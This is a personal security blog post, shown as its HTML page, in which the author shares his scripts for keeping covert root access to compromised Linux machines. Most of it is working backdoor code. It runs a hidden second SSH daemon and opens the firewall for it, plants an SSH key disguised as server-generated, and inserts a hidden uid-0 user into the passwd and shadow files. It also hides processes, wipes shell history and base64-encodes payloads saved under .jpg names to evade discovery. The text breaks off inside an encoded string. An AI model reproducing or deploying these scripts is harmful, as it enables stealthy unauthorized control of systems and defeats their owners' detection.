<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title>My Methods To Achieve Persistence In Linux Systems</title>
		<meta name="HandheldFriendly" content="True">
		<meta name="MobileOptimized" content="320">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">		<link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=daa65498fe">
		<meta name="description" content="Learn how to persist in linux systems. An advanced persistent attack (APT) uses continuous and sophisticated hacking techniques." />
    <link rel="icon" href="/favicon.png" type="image/png" />
    <link rel="canonical" href="https://flaviu.io/advanced-persistent-threat/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <link rel="amphtml" href="https://flaviu.io/advanced-persistent-threat/amp/" />
    
    <meta property="og:site_name" content="Flaviu Popescu" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="My Methods To Achieve Persistence In Linux Systems" />
    <meta property="og:description" content="Learn how to persist in linux systems. An advanced persistent attack (APT) uses continuous and sophisticated hacking techniques." />
    <meta property="og:url" content="https://flaviu.io/advanced-persistent-threat/" />
    <meta property="og:image" content="https://flaviu.io/content/images/2020/07/backdoor.jpg" />
    <meta property="article:published_time" content="2020-07-15T21:17:58.000Z" />
    <meta property="article:modified_time" content="2021-01-25T10:36:17.000Z" />
    <meta property="article:tag" content="backdoor" />
    <meta property="article:tag" content="apt" />
    <meta property="article:tag" content="linux" />
    <meta property="article:tag" content="hacking" />
    
    <meta property="article:author" content="https://www.facebook.com/flaviu.octavian" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="My Methods To Achieve Persistence In Linux Systems" />
    <meta name="twitter:description" content="Learn how to persist in linux systems. An advanced persistent attack (APT) uses continuous and sophisticated hacking techniques." />
    <meta name="twitter:url" content="https://flaviu.io/advanced-persistent-threat/" />
    <meta name="twitter:image" content="https://flaviu.io/content/images/2020/07/backdoor.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Flaviu Popescu" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="backdoor, apt, linux, hacking" />
    <meta name="twitter:site" content="@flavsecurity" />
    <meta name="twitter:creator" content="@flavsecurity" />
    <meta property="og:image:width" content="1920" />
    <meta property="og:image:height" content="1281" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Flaviu Popescu",
        "url": "https://flaviu.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://flaviu.io/content/images/2020/06/flav-logo.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Flaviu Popescu",
        "image": {
            "@type": "ImageObject",
            "url": "https://flaviu.io/content/images/2021/12/Flaviu-Popescu.jpg",
            "width": 1654,
            "height": 1709
        },
        "url": "https://flaviu.io/author/flaviu/",
        "sameAs": [
            "https://www.facebook.com/flaviu.octavian",
            "https://twitter.com/flavsecurity"
        ]
    },
    "headline": "My Methods To Achieve Persistence In Linux Systems",
    "url": "https://flaviu.io/advanced-persistent-threat/",
    "datePublished": "2020-07-15T21:17:58.000Z",
    "dateModified": "2021-01-25T10:36:17.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://flaviu.io/content/images/2020/07/backdoor.jpg",
        "width": 1920,
        "height": 1281
    },
    "keywords": "backdoor, apt, linux, hacking",
    "description": "\n\nFor the past few days I&#x27;ve been thinking whether to share the scripts I&#x27;ve put\ntogether. Being a guy who is fascinated with Offensive Security I felt that\nsharing everything that I worked hard on Â was like giving away my ammunition. \n\nHowever, I strongly feel that sharing my knowledge and my tricks have more\nbenefits to the Info Sec Community and myself.\n\nI also realized the restrains of blogging and only relaying on screenshots\nwithout being able to show proof of concepts via videos. So I dec",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://flaviu.io/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.48" />
    <link rel="alternate" type="application/rss+xml" title="Flaviu Popescu" href="https://flaviu.io/rss/" />
    <script defer src="https://unpkg.com/@tryghost/portal@~1.22.0/umd/portal.min.js" data-ghost="https://flaviu.io/" crossorigin="anonymous" type="786429fe4b3ef8e688d249ce-text/javascript"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <script defer src="/public/cards.min.js?v=daa65498fe" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=daa65498fe">
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-170282358-1" type="786429fe4b3ef8e688d249ce-text/javascript"></script>
<script type="786429fe4b3ef8e688d249ce-text/javascript">
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-170282358-1');
</script>
<link rel="stylesheet" href="https://flaviu.io/content/images/js/prism.min.css" />
<style>
@media (max-width: 479px) {
.post-authors .author-wrap {
min-height:250px;
border-radius: var(--border-radius-primary);
}
}
.post-wrap pre code {
    font-size: 15px !important
}
.breadcrumb ul {
	display: flex;
	padding: 0;
	font-size: 13px;
	margin: 0;
}

.breadcrumb li {
	text-decoration: none;
	list-style: none;
}

.breadcrumb li a {
	border-bottom: none
}

.breadcrumb li + li::before {
	content: "/";
	opacity: 0.5;
	margin: 0 5px;
}
.breadcrumb ul .is-current {
	font-weight: var(--font-weight-primary-bold);
}
.global-top-button{position:fixed;right:1.1%;bottom:-50px;cursor:pointer;transition:bottom .6s ease;border-radius:10px}.global-top-button.is-show{bottom:20px}.global-top-button svg{height:18px;padding:12px 5px;transition-timing-function:ease;transition-duration:.2s;transition-property:background-color,fill;border-radius:10px;background-color:var(--color-elements-two);fill:var(--color-font-button)}.global-top-button:hover svg{background-color:var(--color-details);fill:var(--color-elements-white)}@media (max-width:320px){.global-top-button{display:none}}@media (min-width:320px) and (max-width:1440px){.global-top-button{right:13px}}
.kg-image-card img { height: auto; }
</style>




<style>:root {--ghost-accent-color: #15171A;}</style>
	</head>
	<body class="post-template tag-backdoor tag-apt tag-linux tag-hacking tag-hash-rootkit global-hash-about global-hash-account global-hash-akerva global-hash-author global-hash-bugbounty global-hash-bughunting global-hash-challenges global-hash-cloud global-hash-commands global-hash-contact global-hash-ctf global-hash-dark-version global-hash-details-green global-hash-disclaimer global-hash-easy global-hash-endgame global-hash-enumeration global-hash-firstblog global-hash-fortress global-hash-ghost global-hash-hacked global-hash-hackerone global-hackthebox global-hash-hades global-hash-hardware global-hash-hidden global-hash-insane global-hash-jet global-hash-large global-hash-load-more global-hash-logs global-hash-machines global-hash-medium global-hash-membership global-hash-microsoft global-hash-misc global-hash-mobile global-hash-newsletter global-hash-osint global-hash-phishing global-hash-poo global-hash-powershell global-hash-priviledgeescalation global-hash-pwned global-hash-resources global-hash-reversing global-hash-rootkit global-hash-rpg global-hash-servmon global-hash-stego global-hash-web global-hash-windows global-hash-xen">
		<div class="global-wrap">
			<div class="section-content-wrap">
				<div class="section-header wrap">
	<header class="header-wrap flex">
		<div class="header-logo">
			<div class="is-logo"><a href="https://flaviu.io"><img src="https://flaviu.io/content/images/2020/06/flav-logo.png" alt="Flaviu Popescu"></a></div>

		</div>
		<div class="header-nav">
			<nav class="nav-wrap">
				<label for="toggle" class="nav-label hamburger hamburger-minus">
					<span class="hamburger-box">
						<span class="hamburger-inner"></span>
					</span>
				</label>
				<input type="checkbox" id="toggle" class="nav-toggle">
				<ul class="nav-list">
					
<li class="nav-list-item">
	<a href="https://flaviu.io/" class="nav-link">root@flaviu:~#</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/resources/" class="nav-link">Resources</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/walkthroughs-hackthebox/" class="nav-link">HackTheBox</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/about-me/" class="nav-link">About</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/personal-achievements/" class="nav-link">Achievements</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/contact/" class="nav-link">Contact</a>
	<span class="nav-dot"></span>
</li>

					<li class="section-members-login-panel">
	<a class="members-signin" href="https://flaviu.io/signin/">Sign in</a>
	<a class="members-signup" href="https://flaviu.io/signup/">Sign up</a>
</li>
					<li class="nav-list-item search-open"><span>Search</span><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18.420346,15.5800244 L24,21.1596784 L21.1596784,24 L15.5800244,18.420346 C13.9925104,19.4717887 12.088789,20.0841064 10.0420532,20.0841064 C4.49598037,20.0841064 0,15.5881261 0,10.0420532 C0,4.49598037 4.49598037,0 10.0420532,0 C15.5881261,0 20.0841064,4.49598037 20.0841064,10.0420532 C20.0841064,12.088789 19.4717887,13.9925104 18.420346,15.5800244 Z M10.0420532,16.0672851 C13.3696969,16.0672851 16.0672851,13.3696969 16.0672851,10.0420532 C16.0672851,6.71440951 13.3696969,4.01682129 10.0420532,4.01682129 C6.71440951,4.01682129 4.01682129,6.71440951 4.01682129,10.0420532 C4.01682129,13.3696969 6.71440951,16.0672851 10.0420532,16.0672851 Z"/></svg></li>				</ul>
			</nav>
		</div>
		<div class="blog-description flex">Thoughts, stories and ideas.</div>
	</header>
</div>				<article>
	<div class="section-featured is-featured-image">
	<div class="featured-image" style="background-image: url(https://flaviu.io/content/images/2020/07/backdoor.jpg)"></div>
	<div class="featured-wrap flex">
			<div class="featured-content">
				<div class="tags-wrap">
					<span class="featured-label global-tag"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.9712403,8.05987765 L16.2291373,8.05987765 L12.796794,0.459688839 C12.5516266,-0.153229613 11.4483734,-0.153229613 11.0806223,0.459688839 L7.64827899,8.05987765 L0.906176009,8.05987765 C0.538424938,8.05987765 0.170673866,8.30504503 0.0480901758,8.6727961 C-0.0744935148,9.04054717 0.0480901758,9.40829825 0.293257557,9.65346563 L5.31918887,14.3116459 L3.11268244,22.4021694 C2.99009875,22.7699205 3.11268244,23.1376716 3.48043351,23.382839 C3.72560089,23.6280063 4.21593565,23.6280063 4.46110303,23.5054227 L11.9387082,19.2149935 L19.4163133,23.5054227 C19.538897,23.6280063 19.6614807,23.6280063 19.906648,23.6280063 C20.1518154,23.6280063 20.2743991,23.5054227 20.5195665,23.382839 C20.7647339,23.1376716 20.8873176,22.7699205 20.8873176,22.4021694 L18.6808111,14.3116459 L23.7067424,9.65346563 C23.9519098,9.40829825 24.0744935,9.04054717 23.9519098,8.6727961 C23.7067424,8.30504503 23.3389914,8.05987765 22.9712403,8.05987765 Z"/></svg> <span>Featured</span></span>
					<a class="post-tag global-tag" href="/tag/backdoor/">backdoor</a>
					<a class="post-tag global-tag" href="/tag/apt/">apt</a>
					<a class="post-tag global-tag" href="/tag/linux/">linux</a>
					<a class="post-tag global-tag" href="/tag/hacking/">hacking</a>
				</div>
				<h1 class="white">My Methods To Achieve Persistence In Linux Systems</h1>
				<div class="item-meta white">
					<span>by</span>
					<a href="/author/flaviu/">Flaviu Popescu</a>
					<time datetime="2020-07-15">5 years ago</time>
					<span class="reading-time"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M10.1907692,24 C4.5625628,24 0,19.4374372 0,13.8092308 C0,8.18102433 4.5625628,3.61846154 10.1907692,3.61846154 C15.8189757,3.61846154 20.3815385,8.18102433 20.3815385,13.8092308 C20.3815385,19.4374372 15.8189757,24 10.1907692,24 Z M10.1907692,22 C14.7144062,22 18.3815385,18.3328677 18.3815385,13.8092308 C18.3815385,9.28559383 14.7144062,5.61846154 10.1907692,5.61846154 C5.6671323,5.61846154 2,9.28559383 2,13.8092308 C2,18.3328677 5.6671323,22 10.1907692,22 Z" id="Oval"></path><path d="M7.53230769,2.32923077 C6.98002294,2.32923077 6.53230769,1.88151552 6.53230769,1.32923077 C6.53230769,0.776946019 6.98002294,0.329230769 7.53230769,0.329230769 L12.9225711,0.329230769 C13.4748559,0.329230769 13.9225711,0.776946019 13.9225711,1.32923077 C13.9225711,1.88151552 13.4748559,2.32923077 12.9225711,2.32923077 L7.53230769,2.32923077 Z" id="Line-2"></path><path d="M13.2928932,9.29289322 C13.6834175,8.90236893 14.3165825,8.90236893 14.7071068,9.29289322 C15.0976311,9.68341751 15.0976311,10.3165825 14.7071068,10.7071068 L10.897876,14.5163376 C10.5073517,14.9068618 9.87418674,14.9068618 9.48366245,14.5163376 C9.09313816,14.1258133 9.09313816,13.4926483 9.48366245,13.102124 L13.2928932,9.29289322 Z" id="Line"></path></svg> 11 min read</span>
				</div>
		</div>
	</div>
</div>	<div class="section-post wrap">
		<div class="post-wrap ">
			<nav class="breadcrumb">
    <ul>
        <li><a href="/">Home</a></li>
            <li><a href="/tag/backdoor/">backdoor</a></li>
        <li class="is-current"><a href="/advanced-persistent-threat/">My Methods To Achieve Persistence In Linux Systems</a></li>
    </ul>
</nav>
			<p></p><p>For the past few days I've been thinking whether to share the scripts I've put together. Being a guy who is fascinated with Offensive Security I felt that sharing everything that I worked hard on Â was like giving away my ammunition. </p><p>However, I strongly feel that <strong>sharing </strong>my knowledge and my tricks have more benefits to the Info Sec Community and myself.</p><p>I also realized the restrains of blogging and only relaying on screenshots without being able to show proof of concepts via videos. So I decided to go ahead and create a <a href="https://www.youtube.com/channel/UCvILbl6MnRv8FdTBiFPXaRw">YouTube Channel</a> where I will upload the videos.</p><p>Where possible at the bottom of each article I will attach a video demo.</p><p>These are my Advanced Persistence Threat (APT) tricks that I put together in order to achieve some level of persistence. These methods are not 100% undetectable but it may reserve you a backdoor into the system.</p><blockquote>Before we move on please see /<a href="https://flaviu.io/disclaimer/">disclaimer</a>/</blockquote><h3 id="requirements">Requirements </h3><p>First and foremost I need to make sure that the system in question has all the requirements installed in order to execute all my scripts. The requirements differ from system to system but I am being more broad to target the common linux distros.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

apt=`which apt-get`
if [[ -f $apt ]]; then
apt-get -qq -y update &gt;/dev/null 2&gt;&amp;1
apt-get -qq install cron -y ; apt-get -qq install net-tools -y ; apt-get -qq install systemd -y
which crontab;which netstat;which systemd
echo -e "\e[31mInstalled with apt-get\e[0m"
else
yum -q update -y
yum -q install systemd -y ; yum -q install cron -y;yum -q install net-tools -y
which crontab;which netstat;which systemd
echo -e "\e[31mInstalled with yum\e[0m"
fi
</code></pre><figcaption>I'n going to call this script requirements.sh for the time being.</figcaption></figure><p>With an if-else statement I am checking if the system is using apt or yum.</p><p><strong>Advanced Package Tool</strong> also know as APT works with libraries to handle the installation and removal of packages.</p><p><strong>Yellowdog Updater</strong> also known as YUM is a command line package manager utility for Linux operating systems commonly found on CentOS/RHEL distributions.</p><p>Where needed, I installed cron, net-tools, and systemd.</p><p>Users that set up and maintain software use <strong>Cron </strong>to schedule jobs that are running periodically at fixed intervals.</p><p><strong>Cron </strong>and <strong>Crontab</strong></p><p>The name of the tool is Cron and Crontab is the binary that will print the jobs that cron is executing.</p><p>The <em><strong>Net</strong></em>-<em><strong>tools package</strong></em> is made up of programs which form the base of Linux networking.</p><p><strong>Systemd</strong> is a <strong>Linux</strong> service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, and processes tracking.</p><p>I like to encode my scripts, so below is a version of the initial script that undergone simple b64 encoding and had a file format change.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

echo "IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUgSElTVFNBVkUgSElTVE1PVkUgSElTVFpPTkUgSElTVE9SWSBISVNUTE9HIFVTRVJIT1NUIFJFTU9URUhPU1QgUkVNT1RFVVNFUiBXQVRDSDtoaXN0b3J5IC1uO2V4cG9ydCAgSElTVEZJTEU9L2Rldi9udWxsOyBoaXN0b3J5IC1jCmFwdD1gd2hpY2ggYXB0LWdldGAKaWYgW1sgLWYgJGFwdCBdXTsgdGhlbgphcHQtZ2V0IC1xcSAteSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxCmFwdC1nZXQgLXFxIGluc3RhbGwgY3JvbiAteSA7IGFwdC1nZXQgLXFxIGluc3RhbGwgbmV0LXRvb2xzIC15IDsgYXB0LWdldCAtcXEgaW5zdGFsbCBzeXN0ZW1kIC15CndoaWNoIGNyb250YWI7d2hpY2ggbmV0c3RhdDt3aGljaCBzeXN0ZW1kCmVjaG8gLWUgIlxlWzMxbUluc3RhbGxlZCB3aXRoIGFwdC1nZXRcZVswbSIKZWxzZQp5dW0gLXEgdXBkYXRlIC15Cnl1bSAtcSBpbnN0YWxsIHN5c3RlbWQgLXkgOyB5dW0gLXEgaW5zdGFsbCBjcm9uIC15O3l1bSAtcSBpbnN0YWxsIG5ldC10b29scyAteQp3aGljaCBjcm9udGFiO3doaWNoIG5ldHN0YXQ7d2hpY2ggc3lzdGVtZAplY2hvIC1lICJcZVszMW1JbnN0YWxsZWQgd2l0aCB5dW1cZVswbSIKZmkK" | base64 --decode &gt; /tmp/req.jpg;chmod +x /tmp/req.jpg;/tmp/req.jpg;rm -rf tmp/req.jpg
echo -e "\e[31mDone\e[0m"
</code></pre><figcaption>My final script called requirements.jpg</figcaption></figure><p>In case you are wondering why I'm using .<strong>JPG </strong>format, is just something I prefer. I want to camouflage myself as much as possible in the event "someone" finds my files. Using jpg, gif or other <strong>unsuspicious formats, file names and output folders</strong> might trick the "person" Â into believing it is not something malicious.</p><h3 id="persistence">Persistence</h3><p> This is the main script that does most of the work.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash
if [ -z "${HOME:-}" ]; then export HOME="$(cd ~ &amp;&amp; pwd)"; fi
uid=$(id -u)
if [ -n "${uid}" ] &amp;&amp; [ $uid -ge "0" ] ; then
        admin_port=28822
        administration_key='ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAu6QWR15HphWLI/0MsKbDm82diJJnRJQMwwHneoMA9mlrUxQ/9EJQtcvAEWDYjvnCBIcGs0smish/eCi09EuXO30OUutDobG3FXijjXIIA0RAl0Bxqth6k6PtRdAIsjJhC7obgY4M+aL+pUqpOgKALCEKHPTZJgOK0r8yztDUAaIIWeo1WGhwYnxVi+o5KQWlGywVwhzlDCe6Oey3XKbiMECPA3oesdb/TTk6DqBTiJ2TghAgP93rfpgvnHKYIFf0ZnAOSSEXZ4aAH1SZ+dY48dJsjNquyS8aVoqRymX4XA6qlaPd5rU4HezQiTuWEluG/vS4WOQkxlCe9c6ef44Y0w== system key generated by server 20150113'
        locateUser='system:$6$zA6e8KqHElNiaBv7$gHry0K8nRfUDzyxfW/C0sFGpJjwAtcaiO/RpfWzOow14BO1pATPXhtbb764YLxaEnfLnKudkuSAgPIfB4Jbmg/:18270::99999:7:::'
        inFile='/etc/shadow'
        lUName='system:x:0:0:system:/root:/bin/bash'
        uNFile='/etc/passwd'
        dir_ssh='/root/.ssh/'
        dir_ssh_k="${dir_ssh}authorized_keys"
        bashFfile="/root/.bashrc"
        bashSecLine="/etc/syslogservice &gt;/dev/null 2&gt;&amp;1"
        node_process_id=`netstat -nptl |grep ":$admin_port"`
        banned="sshd -p $admin_port|inject|./sshd:|bing|resolve|system@"
        ufwFile=`which ufw`
        fIptbl=`which iptables`
        if [[ -z $node_process_id ]]; then
                sshd_file=`which sshd`
                $sshd_file -p 28822 &amp;
                sleep 9s
        fi
        if [[ -f $ufwFile ]]; then
                checkUpdatePort=`$ufwFile status | grep $admin_port | grep -iF "allow"`
                if [[ -z $checkUpdatePort ]]; then
                        $ufwFile allow $admin_port
                fi
        fi
        for pid in $(ps -fe | egrep "$banned" | egrep -v 'grep' | awk '{print $2}'); do
            mount -o bind ~/ /proc/$pid
        done
        if [[ -f $fIptbl ]]; then
                check_upgrade_port=`iptables-save | grep -- "-A INPUT -p tcp -m tcp --dport $admin_port -j ACCEPT"`
                if [[ -z $check_upgrade_port ]]; then
                        iptables -A INPUT -p tcp --dport $admin_port -j ACCEPT
                fi
        fi
        outc=$(unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c)

        if [[ -d $dir_ssh ]]; then
        echo "" &gt;/dev/null &amp;
    else
        mkdir $dir_ssh  &gt;/dev/null 2&gt;&amp;1
    fi
    if [[ -f $dir_ssh_k ]]; then
        echo "" &gt;/dev/null &amp;
    else
        touch $dir_ssh_k  &gt;/dev/null 2&gt;&amp;1
    fi
        grep -qF -- "${administration_key}" "${dir_ssh_k}" || echo "${administration_key}" &gt;&gt; "${dir_ssh_k}"
        grep -qF -- "$locateUser" "$inFile" || grep -qF -- "$locateUser" "$inFile" || sed -i '2 i\system:$6$zA6e8KqHElNiaBv7$gHry0K8nRfUDzyxfW/C0sFGpJjwAtcaiO/RpfWzOow14BO1pATPXhtbb764YLxaEnfLnKudkuSAgPIfB4Jbmg/:18270::99999:7:::' /etc/shadow
        grep -qF -- "$lUName" "$uNFile" || grep -qF -- "$lUName" "$uNFile" || sed -i '2 i\system:x:0:0:system:/root:/bin/bash' /etc/passwd
        grep -qF -- "$bashSecLine" "$bashFfile" || echo "$bashSecLine" &gt;&gt; "$bashFfile"
        sed -i '/^PermitRootLogin/s/no/yes/' /etc/ssh/sshd_config &gt;/dev/null 2&gt;&amp;1
        sed -i '/^PrintLastLog/s/yes/no/' /etc/ssh/sshd_config &gt;/dev/null 2&gt;&amp;1

fi</code></pre><figcaption>Script syslog.sh</figcaption></figure><p></p><p>To briefly explain what is happening in this Â script, This script is purposely made for being executed into a system where I would be root. I have created different scripts for systems where I have limited access but still want some form of persistence, I will get into that further along.</p><p>Variables: admin_port, administration_key, locateUser, inFile, lUName, uNFile, dir_ssh, dir_ssh_k, bashFfile, bashSecLine, node_process_id, banned, ufwFile, fIptbl.</p><p>Cloning the ssh port apart from the default one weather it is 22 or the admin has changed this to 2222, my new port will be 28822.</p><p>I am using authorized_keys and placing my own key into the .ssh folder (/root/.ssh/), this key is crafted to look like it was generated by the server itself to blend in. I am also adding a new user called "system" with admin privileges, and this user will be placed right underneath the root user. By default new users are wrote at the bottom of passwd and shadow files but I think by moving it at the top it would be harder to spot.</p><p>This script will be put into /etc/syslogservice.</p><p>The script is also making sure that my new ssh backdoor port will be allowed in the system via ufw and iptables, also adding a new entry in .bashrc.</p><p><strong>.bashrc </strong>initializes an interactive shell session, Any command that is being put in this file is executed whenever a new terminal session is opened.</p><p>I am making use of grep, sed, and echo with the other variables in my script to help me along the way in injecting code in places where I want them to be (e.g changing PermitRootLogin from no to yes in sshd_config).</p><p>Again as with the previous script this will one undergo encoding.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash
unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c;echo "IyEvYmluL2Jhc2gKaWYgWyAteiAiJHtIT01FOi19IiBdOyB0aGVuIGV4cG9ydCBIT01FPSIkKGNkIH4gJiYgcHdkKSI7IGZpCnVpZD0kKGlkIC11KQppZiBbIC1uICIke3VpZH0iIF0gJiYgWyAkdWlkIC1nZSAiMCIgXSA7IHRoZW4KCWFkbWluX3BvcnQ9Mjg4MjIKCWFkbWluaXN0cmF0aW9uX2tleT0nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBQkpRQUFBUUVBdTZRV1IxNUhwaFdMSS8wTXNLYkRtODJkaUpKblJKUU13d0huZW9NQTltbHJVeFEvOUVKUXRjdkFFV0RZanZuQ0JJY0dzMHNtaXNoL2VDaTA5RXVYTzMwT1V1dERvYkczRlhpampYSUlBMFJBbDBCeHF0aDZrNlB0UmRBSXNqSmhDN29iZ1k0TSthTCtwVXFwT2dLQUxDRUtIUFRaSmdPSzByOHl6dERVQWFJSVdlbzFXR2h3WW54VmkrbzVLUVdsR3l3VndoemxEQ2U2T2V5M1hLYmlNRUNQQTNvZXNkYi9UVGs2RHFCVGlKMlRnaEFnUDkzcmZwZ3ZuSEtZSUZmMFpuQU9TU0VYWjRhQUgxU1orZFk0OGRKc2pOcXV5UzhhVm9xUnltWDRYQTZxbGFQZDVyVTRIZXpRaVR1V0VsdUcvdlM0V09Ra3hsQ2U5YzZlZjQ0WTB3PT0gc3lzdGVtIGtleSBnZW5lcmF0ZWQgYnkgc2VydmVyIDIwMTUwMTEzJwoJbG9jYXRlVXNlcj0nc3lzdGVtOiQ2JHpBN2U5S3FIRWxOaWFCdjgkZ0hyeTBLOG5SZlVEenl4ZlcvQzBzRkdwSmp3QXRjYWlPL1JwZld6T293MTRCTzFwQVRQWGh0YmI3NjRZTHhhRW5mTG5LdWRrdVNBZ1BJZkI0SmJtZy86MTgyNzA6Ojk5OTk5Ojc6OjonCglpbkZpbGU9Jy9ldGMvc2hhZG93JwkKCWxVTmFtZT0nc3lzdGVtOng6MDowOnN5c3RlbTovcm9vdDovYmluL2Jhc2gnCgl1TkZpbGU9Jy9ldGMvcGFzc3dkJwoJZGlyX3NzaD0nL3Jvb3QvLnNzaC8nCglkaXJfc3NoX2s9IiR7ZGlyX3NzaH1hdXRob3JpemVkX2tleXMiCgliYXNoRmZpbGU9Ii9yb290Ly5iYXNocmMiCgliYXNoU2VjTGluZT0iL2V0Yy9zeXNsb2dzZXJ2aWNlID4vZGV2L251bGwgMj4mMSIKCW5vZGVfcHJvY2Vzc19pZD1gbmV0c3RhdCAtbnB0bCB8Z3JlcCAiOiRhZG1pbl9wb3J0ImAJCgliYW5uZWQ9InNzaGQgLXAgJGFkbWluX3BvcnR8aW5qZWN0fC4vc3NoZDp8YmluZ3xyZXNvbHZlfHN5c3RlbUAiCQoJdWZ3RmlsZT1gd2hpY2ggdWZ3YAoJZklwdGJsPWB3aGljaCBpcHRhYmxlc2AJCglpZiBbWyAteiAkbm9kZV9wcm9jZXNzX2lkIF1dOyB0aGVuCgkJc3NoZF9maWxlPWB3aGljaCBzc2hkYAoJCSRzc2hkX2ZpbGUgLXAgMjg4MjIgJgkKCQlzbGVlcCA5cwoJZmkKCWlmIFtbIC1mICR1ZndGaWxlIF1dOyB0aGVuCgkJY2hlY2tVcGRhdGVQb3J0PWAkdWZ3RmlsZSBzdGF0dXMgfCBncmVwICRhZG1pbl9wb3J0IHwgZ3JlcCAtaUYgImFsbG93ImAKCQlpZiBbWyAteiAkY2hlY2tVcGRhdGVQb3J0IF1dOyB0aGVuCgkJCSR1ZndGaWxlIGFsbG93ICRhZG1pbl9wb3J0CgkJZmkKCWZpCglmb3IgcGlkIGluICQocHMgLWZlIHwgZWdyZXAgIiRiYW5uZWQiIHwgZWdyZXAgLXYgJ2dyZXAnIHwgYXdrICd7cHJpbnQgJDJ9Jyk7IGRvCgkgICAgbW91bnQgLW8gYmluZCB+LyAvcHJvYy8kcGlkCglkb25lCglpZiBbWyAtZiAkZklwdGJsIF1dOyB0aGVuCgkJY2hlY2tfdXBncmFkZV9wb3J0PWBpcHRhYmxlcy1zYXZlIHwgZ3JlcCAtLSAiLUEgSU5QVVQgLXAgdGNwIC1tIHRjcCAtLWRwb3J0ICRhZG1pbl9wb3J0IC1qIEFDQ0VQVCJgCgkJaWYgW1sgLXogJGNoZWNrX3VwZ3JhZGVfcG9ydCBdXTsgdGhlbgoJCQlpcHRhYmxlcyAtQSBJTlBVVCAtcCB0Y3AgLS1kcG9ydCAkYWRtaW5fcG9ydCAtaiBBQ0NFUFQgCgkJZmkKCWZpCglvdXRjPSQodW5zZXQgSElTVEZJTEUgSElTVFNBVkUgSElTVE1PVkUgSElTVFpPTkUgSElTVE9SWSBISVNUTE9HIFVTRVJIT1NUIFJFTU9URUhPU1QgUkVNT1RFVVNFUiBXQVRDSDtoaXN0b3J5IC1uO2V4cG9ydCAgSElTVEZJTEU9L2Rldi9udWxsOyBoaXN0b3J5IC1jKQoKCWlmIFtbIC1kICRkaXJfc3NoIF1dOyB0aGVuCiAgICAJZWNobyAiIiA+L2Rldi9udWxsICYKICAgIGVsc2UKICAgIAlta2RpciAkZGlyX3NzaCAgPi9kZXYvbnVsbCAyPiYxCiAgICBmaQogICAgaWYgW1sgLWYg